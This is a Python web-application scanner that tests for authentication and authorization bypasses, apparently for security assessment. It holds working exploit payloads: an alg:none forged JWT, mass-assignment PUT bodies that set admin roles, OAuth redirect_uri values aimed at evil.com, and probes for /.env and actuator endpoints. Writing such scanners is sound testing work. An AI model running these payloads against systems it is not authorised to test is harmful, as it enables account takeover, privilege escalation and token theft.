#!/usr/bin/env python3
"""Auth Bypass Scanner — Authentication & Authorization bypass detection.

Covers: CWE-287 (Auth Bypass), CWE-284 (Access Control), CWE-915 (Mass Assignment),
        CWE-200 (Info Disclosure via GraphQL), CWE-327 (JWT alg:none),
        CWE-601 (OAuth redirect_uri bypass).

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import base64
import json
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from lib import (
    Finding, RateLimitedSession, get_session_from_env, log,
    parse_base_args, save_findings, load_config,
)

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------

DEFAULT_ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/dashboard",
    "/sidekiq", "/sidekiq/",
    "/rails/info", "/rails/info/routes", "/rails/mailers",
    "/api/admin", "/api/admin/users", "/api/internal",
    "/graphql", "/api/graphql", "/gql", "/graphiql",
    "/_debug", "/debug",
    "/swagger", "/swagger.json", "/api-docs", "/openapi.json",
    "/health", "/healthcheck", "/status",
    "/metrics", "/prometheus",
    "/env", "/.env",
    "/config", "/api/config",
    "/actuator", "/actuator/env", "/actuator/health",
    "/wp-admin", "/wp-login.php",
    "/__debug__", "/django-admin/",
    "/server-status", "/server-info",
]

DEFAULT_ADMIN_INDICATORS = [
    "dashboard", "admin", "sidekiq", "routes", "graphql",
    "schema", "mutation", "query", "swagger", "openapi",
    "debug", "config", "environment", "database", "actuator",
    "django", "phpinfo", "server-status",
]

DEFAULT_MASS_ASSIGN_PAYLOADS = [
    {"role": "admin"},
    {"admin": True},
    {"is_admin": True},
    {"role_id": 1},
    {"type": "Admin"},
    {"verified": True},
    {"email_verified": True},
    {"is_staff": True},
    {"permissions": ["admin"]},
]

DEFAULT_UPDATE_ENDPOINTS = [
    "/api/users/me", "/api/account", "/api/profile",
    "/account.json", "/api/settings",
]

DEFAULT_OAUTH_PATHS = [
    "/oauth/authorize", "/auth/authorize", "/api/oauth/authorize",
    "/connect/authorize", "/oauth2/authorize",
]

DEFAULT_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "https://evil.com@TARGET_HOST",
    "https://TARGET_HOST.evil.com",
    "//evil.com",
    "https://evil.com#.TARGET_HOST",
    "https://evil.com%40TARGET_HOST",
    "https://TARGET_HOST/../../evil.com",
]


def test_admin_access(
    sess: RateLimitedSession, base: str, admin_paths: list[str],
    indicators: list[str], dry_run: bool,
) -> list[Finding]:
    """Probe administrative endpoints for unauthorized access."""
    findings: list[Finding] = []

    for path in admin_paths:
        url = f"{base}{path}"
        if dry_run:
            log.info("[dry-run] Would GET %s", url)
            continue
        try:
            r = sess.get(url, allow_redirects=False)
            log.info("  GET %s → %d (%d bytes)", path, r.status_code, len(r.content))
            if r.status_code == 200 and len(r.content) > 100:
                body_lower = r.text.lower()
                is_admin = any(ind in body_lower for ind in indicators)
                if is_admin:
                    findings.append(Finding(
                        title=f"Unauthorized Access — {path}",
                        severity="high",
                        cwe="CWE-284",
                        endpoint=url,
                        method="GET",
                        description=f"Admin/internal endpoint {path} accessible without authorization.",
                        steps=[
                            "Authenticate as regular user",
                            f"GET {url}",
                            f"Response: {r.status_code} with admin content",
                        ],
                        impact="Access to administrative functionality.",
                        evidence={"status": r.status_code, "snippet": r.text[:500]},
                    ))
                    log.warning("⚠ Admin access: %s → %d", path, r.status_code)
        except Exception as e:
            log.debug("  %s: %s", path, e)

    return findings


def test_graphql_introspection(
    sess: RateLimitedSession, base: str, dry_run: bool,
) -> list[Finding]:
    """Test GraphQL introspection (schema leak)."""
    findings: list[Finding] = []
    graphql_paths = ["/graphql", "/api/graphql", "/gql"]
    query = {"query": "{ __schema { queryType { name } mutationType { name } types { name fields { name } } } }"}

    for path in graphql_paths:
        url = f"{base}{path}"
        if dry_run:
            log.info("[dry-run] Would POST %s with introspection query", url)
            continue
        try:
            r = sess.post(url, json=query)
            if r.status_code == 200:
                data = r.json()
                if "data" in data and "__schema" in data.get("data", {}):
                    schema = data["data"]["__schema"]
                    type_count = len(schema.get("types", []))
                    findings.append(Finding(
                        title=f"GraphQL Introspection at {path}",
                        severity="medium",
                        cwe="CWE-200",
                        endpoint=url,
                        method="POST",
                        description=f"Introspection enabled — {type_count} types exposed.",
                        steps=[f"POST {url}", "Send introspection query", f"Schema: {type_count} types"],
                        impact="Full API schema disclosed.",
                        evidence={"type_count": type_count},
                    ))
                    log.warning("⚠ GraphQL introspection: %s (%d types)", path, type_count)
            log.info("  POST %s → %d", path, r.status_code)
        except Exception as e:
            log.debug("  %s: %s", path, e)

    return findings


def test_jwt_manipulation(
    sess: RateLimitedSession, base: str, dry_run: bool,
) -> list[Finding]:
    """Test JWT alg:none and sensitive data leakage."""
    findings: list[Finding] = []
    if dry_run:
        log.info("[dry-run] Would test JWT manipulation")
        return findings

    # Find JWT in cookies or headers
    jwt_token = None
    for cookie in sess.session.cookies:
        if "jwt" in cookie.name.lower() or "token" in cookie.name.lower():
            jwt_token = cookie.value
            break
    if not jwt_token:
        auth = sess.session.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            jwt_token = auth[7:]
    if not jwt_token:
        log.info("  No JWT found — skipping")
        return findings

    try:
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return findings

        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        log.info("  JWT alg: %s, payload keys: %s", header.get("alg"), list(payload.keys()))

        # Test alg:none
        none_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        none_token = f"{none_header}.{parts[1]}."

        test_sess = RateLimitedSession()
        test_sess.session.headers["Authorization"] = f"Bearer {none_token}"
        r = test_sess.get(f"{base}/api/users/me")
        if r.status_code == 200:
            findings.append(Finding(
                title="JWT Algorithm None Bypass",
                severity="critical",
                cwe="CWE-327",
                endpoint=f"{base}/api/users/me",
                description="Server accepts JWT with alg:none — signature bypass.",
                impact="Complete authentication bypass.",
            ))
            log.warning("⚠ JWT alg:none BYPASS!")

        # Sensitive data in payload
        sensitive = ["email", "role", "admin", "password", "secret", "ssn"]
        leaked = [k for k in payload if k.lower() in sensitive]
        if leaked:
            findings.append(Finding(
                title="Sensitive Data in JWT Payload",
                severity="medium",
                cwe="CWE-200",
                endpoint=base,
                description=f"JWT contains sensitive fields: {leaked}",
                evidence={"leaked_fields": leaked},
            ))

    except Exception as e:
        log.debug("  JWT analysis: %s", e)

    return findings


def test_mass_assignment(
    sess: RateLimitedSession, base: str, endpoints: list[str],
    payloads: list[dict], dry_run: bool,
) -> list[Finding]:
    """Test mass assignment / strong params bypass (CWE-915)."""
    findings: list[Finding] = []

    for url_path in endpoints:
        url = f"{base}{url_path}"
        for payload in payloads:
            if dry_run:
                log.info("[dry-run] Would PUT %s with %s", url, payload)
                continue
            try:
                r = sess.put(url, json=payload)
                if r.status_code in (200, 204):
                    check = sess.get(url)
                    if check.status_code == 200:
                        data = check.json()
                        for key, value in payload.items():
                            if str(data.get(key)) == str(value):
                                findings.append(Finding(
                                    title=f"Mass Assignment — {key} on {url_path}",
                                    severity="critical",
                                    cwe="CWE-915",
                                    endpoint=url,
                                    method="PUT",
                                    description=f"'{key}={value}' accepted. Privilege escalation possible.",
                                    steps=[
                                        f"PUT {url} with {json.dumps(payload)}",
                                        f"GET {url} confirms {key}={value}",
                                    ],
                                    impact="Privilege escalation via mass assignment.",
                                    evidence=payload,
                                ))
                                log.warning("⚠ Mass assignment: %s=%s on %s", key, value, url)
                log.info("  PUT %s %s → %d", url_path, payload, r.status_code)
            except Exception as e:
                log.debug("  %s: %s", url_path, e)

    return findings


def test_oauth_redirect(
    sess: RateLimitedSession, base: str, oauth_paths: list[str],
    redirect_payloads: list[str], dry_run: bool,
) -> list[Finding]:
    """Test OAuth redirect_uri manipulation (CWE-601)."""
    findings: list[Finding] = []
    host = base.split("//")[-1].split("/")[0]

    for path in oauth_paths:
        url = f"{base}{path}"
        for payload_tpl in redirect_payloads:
            payload = payload_tpl.replace("TARGET_HOST", host)
            if dry_run:
                log.info("[dry-run] Would GET %s?redirect_uri=%s", url, payload[:40])
                continue
            try:
                r = sess.get(url, params={
                    "client_id": "test",
                    "redirect_uri": payload,
                    "response_type": "code",
                }, allow_redirects=False)
                if r.status_code in (301, 302, 303, 307, 308):
                    location = r.headers.get("Location", "")
                    if "evil.com" in location.lower():
                        findings.append(Finding(
                            title=f"OAuth redirect_uri Bypass — {path}",
                            severity="high",
                            cwe="CWE-601",
                            endpoint=url,
                            description=f"OAuth redirects to attacker URL: {location}",
                            steps=[
                                f"GET {url}?redirect_uri={payload}",
                                f"→ Location: {location}",
                            ],
                            impact="OAuth token theft via redirect_uri manipulation.",
                            evidence={"payload": payload, "location": location},
                        ))
                        log.warning("⚠ OAuth redirect: %s → %s", payload[:30], location)
                        break
                log.info("  GET %s?redirect_uri=%s → %d", path, payload[:30], r.status_code)
            except Exception as e:
                log.debug("  %s: %s", path, e)

    return findings


def main() -> None:
    parser = parse_base_args()
    args = parser.parse_args()
    if args.verbose:
        log.setLevel("DEBUG")

    sess = get_session_from_env()
    base = args.target.rstrip("/")
    config = load_config(args.config)
    findings: list[Finding] = []

    admin_paths = config.get("admin_paths", DEFAULT_ADMIN_PATHS)
    indicators = config.get("admin_indicators", DEFAULT_ADMIN_INDICATORS)
    mass_endpoints = config.get("update_endpoints", DEFAULT_UPDATE_ENDPOINTS)
    mass_payloads = config.get("mass_assign_payloads", DEFAULT_MASS_ASSIGN_PAYLOADS)
    oauth_paths = config.get("oauth_paths", DEFAULT_OAUTH_PATHS)
    redirect_payloads = config.get("redirect_payloads", DEFAULT_REDIRECT_PAYLOADS)

    log.info("=" * 60)
    log.info("Auth Bypass Scanner (CWE-287, CWE-284, CWE-915)")
    log.info("Target: %s | Dry-run: %s", base, args.dry_run)
    log.info("=" * 60)

    tests = [
        ("Admin endpoint probing", lambda: test_admin_access(sess, base, admin_paths, indicators, args.dry_run)),
        ("GraphQL introspection", lambda: test_graphql_introspection(sess, base, args.dry_run)),
        ("JWT manipulation", lambda: test_jwt_manipulation(sess, base, args.dry_run)),
        ("Mass assignment", lambda: test_mass_assignment(sess, base, mass_endpoints, mass_payloads, args.dry_run)),
        ("OAuth redirect_uri", lambda: test_oauth_redirect(sess, base, oauth_paths, redirect_payloads, args.dry_run)),
    ]

    for name, test_fn in tests:
        log.info("[%s]", name)
        try:
            findings.extend(test_fn())
        except Exception as e:
            log.error("  %s failed: %s", name, e)

    log.info("=" * 60)
    log.info("Results: %d findings", len(findings))
    save_findings(findings, "auth-bypass")


if __name__ == "__main__":
    main()
